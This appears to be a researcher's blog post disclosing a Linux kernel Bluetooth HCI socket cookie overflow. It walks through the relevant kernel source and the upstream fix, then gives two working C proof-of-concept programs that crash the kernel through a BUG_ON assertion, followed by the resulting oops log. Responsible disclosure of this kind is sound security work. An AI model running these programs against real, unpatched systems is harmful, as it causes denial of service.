---
layout: post
title:  "Finding bugs in the Linux Kernel Bluetooth Subsystem: Exploiting HCI socket cookie generation"
date:   2022-07-29 04:34:27 -0400
categories: linux
---
## Introduction

This blog post describes a recent [bug] I found in the HCI socket cookie generation mechanism.

## HCI Sockets

I have written a short summary regarding HCI sockets in my [previous] blog post. 

## The bug

The bug exists in `lib/idr.c`, in the `ida_free` function, if the `id` parameter has a negative value then a `BUG_ON` macro is triggered:
```c
 * ida_free() - Release an allocated ID.
 * @ida: IDA handle.
 * @id: Previously allocated ID.
 *
 * Context: Any context.
 */
void ida_free(struct ida *ida, unsigned int id)
{
	BUG_ON((int)id < 0);
```

## Breakdown

The [bug] could be triggered as a local user, using HCI sockets.

Each time the ioctl handler `HCIGETDEVINFO` is called on a newly initialized HCI socket, with `socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI)`, a cookie value is generated: a 4 byte signed integer (on modern architectures):
```c
static int hci_sock_ioctl(struct socket *sock, unsigned int cmd,
			  unsigned long arg)
{
	void __user *argp = (void __user *)arg;
	struct sock *sk = sock->sk;
	[...]
	if (hci_pi(sk)->channel != HCI_CHANNEL_RAW) {
		err = -EBADFD;
		goto done;
	}

	/* When calling an ioctl on an unbound raw socket, then ensure
	 * that the monitor gets informed. Ensure that the resulting event
	 * is only send once by checking if the cookie exists or not. The
	 * socket cookie will be only ever generated once for the lifetime
	 * of a given socket.
	 */
	if (hci_sock_gen_cookie(sk)) {
```

From `net/bluetooth/hci_sock.c`:
```c
static bool hci_sock_gen_cookie(struct sock *sk)
{
	int id = hci_pi(sk)->cookie;

	if (!id) {
		id = ida_simple_get(&sock_cookie_ida, 1, 0, GFP_KERNEL);
		if (id < 0)
			id = 0xffffffff;

		hci_pi(sk)->cookie = id;
```
Note that `ida_simple_get()` does set an upper bound to the id member of each HCI socket.
If 2^31 HCI sockets are created, this should trigger a negative cookie value, which when the 2^31 socket is released the `BUG_ON` macro is triggered, given a 4 byte size signed integer.

When the socket is released, the `ida_simple_remove()` is called with the cookie value:

```c
static void hci_sock_free_cookie(struct sock *sk)
{
	int id = hci_pi(sk)->cookie;

	if (id) {
		hci_pi(sk)->cookie = 0xffffffff;
		ida_simple_remove(&sock_cookie_ida, id);
```
Where `ida_simple_remove()` is defined as:
```c
#define ida_simple_remove(ida, id)	ida_free(ida, id)
```

I have faced some difficulties, firstly with small RAM space. Given that allocating 2^31 HCI sockets would trigger a creation of a large amount of resident pages in RAM, I tried to bypass this using another bug, in the HCI socket's bind implementation:

```c
static int hci_sock_bind(struct socket *sock, struct sockaddr *addr,
			 int addr_len)
{
	struct sockaddr_hci haddr;
	[...]
	case HCI_CHANNEL_MONITOR:
		if (haddr.hci_dev != HCI_DEV_NONE) {
			err = -EINVAL;
			goto done;
		}

		if (!capable(CAP_NET_RAW)) {
			err = -EPERM;
			goto done;
		}

		hci_pi(sk)->channel = haddr.hci_channel;
```
When an HCI socket is bound to a `HCI_CHANNEL_MONITOR` channel, when freeing the socket; the socket object is freed, yet `ida_simple_remove()` is not called with the cookie id assigned to the HCI socket. Albeit, this requires a `CAP_NET_RAW` capability in the root user namespace.

```c

static int hci_sock_release(struct socket *sock)
{
	struct sock *sk = sock->sk;
	struct hci_dev *hdev;
	struct sk_buff *skb;
	[...]

	switch (hci_pi(sk)->channel) {
	case HCI_CHANNEL_MONITOR:
		atomic_dec(&monitor_promisc);
		break;
	case HCI_CHANNEL_RAW:
	case HCI_CHANNEL_USER:
	case HCI_CHANNEL_CONTROL:
		/* Send event to monitor */
		skb = create_monitor_ctrl_close(sk);
		if (skb) {
			hci_send_to_channel(HCI_CHANNEL_MONITOR, skb,
					    HCI_SOCK_TRUSTED, NULL);
			kfree_skb(skb);
		}

		hci_sock_free_cookie(sk);
		break;
	}
	[...]
```
The function `hci_sock_free_cookie()` is called only when the HCI socket channel is either `HCI_CHANNEL_RAW`, `HCI_CHANNEL_USER` or `HCI_CHANNEL_CONTROL`.
This allows me to trigger the `BUG_ON` macro without any RAM size requirements.

## The fix

The [fix] was simply to remove the `BUG_ON` macro from the `ida_free()` function:

```c
void ida_free(struct ida *ida, unsigned int id)
{
	[...]
-	BUG_ON((int)id < 0);
+	if ((int)id < 0)
+		return;
```

## Exploitation


```c
// SPDX-License-Identifier: GPL-2.0-or-later
/*
 *
 *  BlueZ - Bluetooth protocol stack for Linux
 *
 *  Copyright (C) 2000-2001  Qualcomm Incorporated
 *  Copyright (C) 2002-2003  Maxim Krasnyansky <maxk@qualcomm.com>
 *  Copyright (C) 2002-2010  Marcel Holtmann <marcel@holtmann.org>
 *
 *
 */


#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include "lib/bluetooth.h"
#include "lib/hci.h"


int main(){

        int fd;
        struct hci_dev_info di = {0};
        di.dev_id = 0;
        struct sockaddr_hci haddr = {0};
        haddr.hci_family = AF_BLUETOOTH;
        haddr.hci_channel=2; // HCI_CHANNEL_MONITOR
        haddr.hci_dev = 0xffff; // HCI_DEV_NONE
        for(uint64_t i = 0; i < 2147483648;i++){
			fd = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
			ioctl(fd, HCIGETDEVINFO, &di);
			bind(fd, (struct sockaddr *)&haddr, sizeof(struct
	sockaddr_hci));
			close(fd);
        }
}
```

The `"BUG_ON"` failed assertion trigger, run as a local user after 2^31-1
HCI sockets' cookies were generated:

```c
// SPDX-License-Identifier: GPL-2.0-or-later
/*
 *
 *  BlueZ - Bluetooth protocol stack for Linux
 *
 *  Copyright (C) 2000-2001  Qualcomm Incorporated
 *  Copyright (C) 2002-2003  Maxim Krasnyansky <maxk@qualcomm.com>
 *  Copyright (C) 2002-2010  Marcel Holtmann <marcel@holtmann.org>
 *
 *
 */

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include "lib/bluetooth.h"
#include "lib/hci.h"

int main(){
        struct hci_dev_info di = {0};
        di.dev_id = 0;
        int fd = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
        ioctl(fd, HCIGETDEVINFO, &di);
        close(fd);

}
```

This, in turn triggers the following log:

>```
>[69803.437346] kernel BUG at /build/linux-hwe-5.4-qwJpmT/linux-hwe-5.4-
>5.4.0/lib/idr.c:492!
>[69803.437351] invalid opcode: 0000 [#1] SMP NOPTI
>[69803.437353] CPU: 2 PID: 26662 Comm: hci_crash Tainted: G
>OE     5.4.0-97-generic #110~18.04.1-Ubuntu
>[69803.437354] Hardware name: Dell Inc. Precision 5820 Tower/06JWJY,
>BIOS 2.5.1 10/20/2020
>[69803.437359] RIP: 0010:ida_free+0x120/0x140
>[69803.437361] Code: 48 8d 7d a8 31 f6 e8 9f ee 00 00 be 00 04 00 00 4c
>89 ef e8 52 9c a7 ff 48 3d 00 04 00 00 75 ce 4c 89 ef e8 62 61 7f ff eb
>b9 <0f> 0b 4b 8d 74 2d 01 48 8d 7d a8 e8 70 04 01 00 eb b2 e8 09 f4 5e
>[69803.437362] RSP: 0018:ffffa52bc1cabdb0 EFLAGS: 00010286
>[69803.437363] RAX: 00000000003fffff RBX: ffff978253453000 RCX:
>0000001088064d8d
>[69803.437364] RDX: 0000001088064d8c RSI: 00000000ffffffff RDI:
>ffffffffc0c39250
>[69803.437365] RBP: ffffa52bc1cabe08 R08: ffff97825fcb7a80 R09:
>ffff9781266c7400
>[69803.437366] R10: 0000000000000008 R11: ffff9781241310c0 R12:
>00000000000003ff
>[69803.437366] R13: ffffffffc0c437c0 R14: ffff9782599eef20 R15:
>ffff9781870a3240
>[69803.437368] FS:  00000000010bc300(0000) GS:ffff97825fc80000(0000)
>knlGS:0000000000000000
>[69803.437368] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
>[69803.437370] CR2: 00007ffe67758020 CR3: 0000000f1d490004 CR4:
>00000000003606e0
>[69803.437371] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
>0000000000000000
>[69803.437371] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7:
>0000000000000400
>[69803.437372] Call Trace:
>[69803.437393]  hci_sock_release+0x19a/0x1c0 [bluetooth]
>[69803.437396]  __sock_release+0x42/0xc0
>[69803.437397]  sock_close+0x15/0x20
>[69803.437399]  __fput+0xc6/0x260
>[69803.437400]  ____fput+0xe/0x10
>[69803.437402]  task_work_run+0x9d/0xc0
>[69803.437404]  exit_to_usermode_loop+0x109/0x130
>[69803.437406]  do_syscall_64+0x170/0x190
>[69803.437408]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
>[69803.437410] RIP: 0033:0x43dd73
>[69803.437411] Code: 64 89 02 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00
>00 00 00 00 66 90 64 8b 04 25 18 00 00 00 85 c0 75 14 b8 03 00 00 00 0f
>05 <48> 3d 00 f0 ff ff 77 45 c3 0f 1f 40 00 48 83 ec 18 89 7c 24 0c e8
>[69803.437411] RSP: 002b:00007ffe6765c038 EFLAGS: 00000246 ORIG_RAX:
>0000000000000003
>[69803.437413] RAX: 0000000000000000 RBX: 0000000000400488 RCX:
>000000000043dd73
>[69803.437413] RDX: 00007ffe6765c040 RSI: 00000000800448d3 RDI:
>0000000000000003
>[69803.437414] RBP: 00007ffe6765c0a0 R08: 000000000000000c R09:
>0000000000000002
>[69803.437415] R10: 0000000000000002 R11: 0000000000000246 R12:
>0000000000402b20
>[69803.437415] R13: 0000000000000000 R14: 00000000004ac018 R15:
>0000000000400488
>[69803.437417] Modules linked in: cmac rfcomm bnep btusb btrtl btbcm
>btintel bluetooth ecdh_generic ecc twofish_generic twofish_avx_x86_64
>twofish_x86_64_3way twofish_x86_64 twofish_common serpent_avx2
>serpent_avx_x86_64 serpent_sse2_x86_64 serpent_generic blowfish_generic
>blowfish_x86_64 blowfish_common cast5_avx_x86_64 cast5_generic
>cast_common des_generic libdes camellia_generic camellia_aesni_avx2
>camellia_aesni_avx_x86_64 camellia_x86_64 xcbc md4 algif_hash xfrm_user
>xfrm4_tunnel tunnel4 ipcomp xfrm_ipcomp esp4 ah4 af_key xfrm_algo
>anyconnect_kdf(OE) snd_hda_codec_hdmi intel_rapl_msr intel_rapl_common
>nls_iso8859_1 dell_smm_hwmon snd_hda_codec_realtek
>snd_hda_codec_generic ledtrig_audio snd_hda_intel snd_intel_dspcfg
>isst_if_common snd_hda_codec skx_edac nfit snd_hda_core snd_hwdep
>snd_pcm x86_pkg_temp_thermal intel_powerclamp coretemp kvm_intel
>snd_seq_midi snd_seq_midi_event snd_rawmidi kvm snd_seq rapl
>intel_cstate snd_seq_device snd_timer ucsi_ccg dell_wmi ioatdma mei_me
>typec_ucsi
>[69803.437442]  snd serio_raw dell_smbios dcdbas sparse_keymap wmi_bmof
>intel_wmi_thunderbolt typec joydev dell_wmi_descriptor input_leds mei
>soundcore dca acpi_tad mac_hid ipt_REJECT nf_reject_ipv4 nf_log_ipv4
>nf_log_common xt_LOG xt_limit xt_tcpudp xt_addrtype xt_conntrack
>ip6_tables nf_conntrack_netbios_ns nf_conntrack_broadcast sch_fq_codel
>nf_nat_ftp nf_nat nf_conntrack_ftp nf_conntrack nf_defrag_ipv6
>nf_defrag_ipv4 libcrc32c parport_pc iptable_filter bpfilter ppdev lp
>parport ip_tables x_tables autofs4 algif_skcipher af_alg dm_crypt
>hid_generic usbhid hid uas usb_storage nouveau nvme nvme_core mxm_wmi
>video i2c_algo_bit ttm crct10dif_pclmul crc32_pclmul drm_kms_helper
>ghash_clmulni_intel aesni_intel syscopyarea sysfillrect crypto_simd
>sysimgblt cryptd fb_sys_fops glue_helper drm vmd e1000e i2c_nvidia_gpu
>ahci libahci wmi
>[69803.437471] ---[ end trace 650bd857a8213515 ]---
>[69803.515535] RIP: 0010:ida_free+0x120/0x140
>[69803.515544] Code: 48 8d 7d a8 31 f6 e8 9f ee 00 00 be 00 04 00 00 4c
>89 ef e8 52 9c a7 ff 48 3d 00 04 00 00 75 ce 4c 89 ef e8 62 61 7f ff eb
>b9 <0f> 0b 4b 8d 74 2d 01 48 8d 7d a8 e8 70 04 01 00 eb b2 e8 09 f4 5e
>[69803.515548] RSP: 0018:ffffa52bc1cabdb0 EFLAGS: 00010286
>[69803.515553] RAX: 00000000003fffff RBX: ffff978253453000 RCX:
>0000001088064d8d
>[69803.515556] RDX: 0000001088064d8c RSI: 00000000ffffffff RDI:
>ffffffffc0c39250
>[69803.515559] RBP: ffffa52bc1cabe08 R08: ffff97825fcb7a80 R09:
>ffff9781266c7400
>[69803.515562] R10: 0000000000000008 R11: ffff9781241310c0 R12:
>00000000000003ff
>[69803.515566] R13: ffffffffc0c437c0 R14: ffff9782599eef20 R15:
>ffff9781870a3240
>[69803.515570] FS:  00000000010bc300(0000) GS:ffff97825fc80000(0000)
>knlGS:0000000000000000
>[69803.515573] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
>[69803.515576] CR2: 00007ffe67758020 CR3: 0000000f1d490004 CR4:
>00000000003606e0
>[69803.515579] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
>0000000000000000
>[69803.515582] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7:
>0000000000000400
>```

## Timeline
> 10/07/2022 - The bug was reported to security@kernel.org
>
> 11/07/2022 - The fix was [commited] by Linus Torvalds and Matthew Wilcox.

[commit]: https://github.com/torvalds/linux/commit/fc82bbf4dede758007763867d0282353c06d1121 
[commited]: https://github.com/torvalds/linux/commit/fc82bbf4dede758007763867d0282353c06d1121 
[bug]: https://github.com/torvalds/linux/commit/fc82bbf4dede758007763867d0282353c06d1121 
[fix]: https://github.com/torvalds/linux/commit/fc82bbf4dede758007763867d0282353c06d1121 
[previous]: /linux/2022/07/29/finding-bugs-in-the-linux-kernel-bt-subsystem-part-1.html
